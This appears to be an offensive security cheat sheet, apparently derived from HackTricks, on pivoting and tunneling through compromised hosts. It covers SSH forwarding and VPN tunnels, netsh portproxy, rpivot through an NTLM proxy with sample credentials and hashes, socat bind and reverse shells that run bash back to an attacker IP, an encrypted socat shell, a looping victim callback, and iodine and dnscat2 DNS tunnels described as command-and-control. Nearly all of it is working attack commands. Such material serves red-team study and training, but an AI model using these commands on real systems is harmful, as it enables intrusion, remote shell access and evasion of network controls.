```
https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
```

## Bash 
```bash
Host -> Jump -> InternalA -> InternalB
# On the jump server connect the port 3333 to the 5985

- mknod backpipe p;
- nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
# Expose port 3333 and connect it to the winrm port of InternalB
- exec 3<>/dev/tcp/internalB/5985
- exec 4<>/dev/tcp/Jump/3333

- cat <&3 >&4 &
- cat <&4 >&3 &

# Fom the host, you can now access InternalB from the Jump server
- evil-winrm -u username -i Jump
```

## SSH 
```bash
# SSH graphical connection
- ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### local port2port
```bash
Open new Port in SSH Server --> Other port

# local
- ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere

# remote
- ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### port2port
```
Local port --> Compromised host (SSH) --> Third_box:Port
```
```bash
- ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f] #This way the terminal is still in your host

#Example

- sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (via proxychains)
```
Local Port --> Compromised host (SSH) --> Wherever
```
```bash
- ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### VPN Tunnel 
```
You need root in both devices (as you are going to create new interfaces) and the sshd config has to allow root login:

- PermitRootLogin yes 
- PermitTunnel yes
```

```bash
- ssh username@server -w any:any #This wil create Tun interfaces in both devices

- ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
- ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP

# Enable forwarding in Server side
- echo 1 > /proc/sys/net/ipv4/ip_forward
- iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE

# Set new route on client side
- route add -net 10.0.0.0/16 gw 1.1.1.1
```

---

## Windows NetSH

### port2port
```powershell
- netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp

# Example:
- netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444

# Check the port forward was created:
- netsh interface portproxy show v4tov4

# Delete port forward
- netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

---

## Pivot Through NTLM Proxy using Rpivot
```bash
# git clone https://github.com/klsecservices/rpivot

# password
python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd

# hashes
python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

### NTLM Proxy Bypass
```bash
# The previously mentioned tool: Rpivot
# OpenVPN can also bypass it, setting these options in the configuration file:
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### cntlm
```bash
# http://cntlm.sourceforge.net/

# It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.

# Example that forward port 443

# Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.

# You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.
```

---
# Socat Hackz


## Bind Shell

```bash
# victim
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# attacker
socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```


## reverse shell

```bash
# attacker
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

# victim
socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## port2port through socks
```bash
socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

## SSL Socat Tunnel

```bash
# 1. Create certificates in both sides: Client and Server
# 2. Execute these commands in both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem

# attacker
socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh

# victim 
socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### remote port2port with SSL Tunnel Socat

```bash
# Connect the local SSH port (22) to the 443 port of the attacker host

# attacker
sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 
	#Redirect port 2222 to port 443 in localhost


# victim
while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done 
	# Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22

# attacker
ssh localhost -p 2222 -l www-data -i vulnerable 
	#Connects to the ssh of the victim
```

---

## DNS Tunneling

```bash
# lodine : https://code.kryo.se/iodine/

# Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.

# attacker
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com

# victim
iodine -f -P P@ssw0rd tunneldomain.com -r

#You can see the victim at 1.1.1.2
# The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:

ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2
##### Establishes a C&C Through DNS, it does NOT need root privileges
```bash
# https://github.com/iagox86/dnscat2

# attacker
ruby ./dnscat2.rb tunneldomain.com

# victim
./dnscat2 tunneldomain.com
```
##### port forwarding with DNSCat
```bash
session -i <sessions_id>

listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
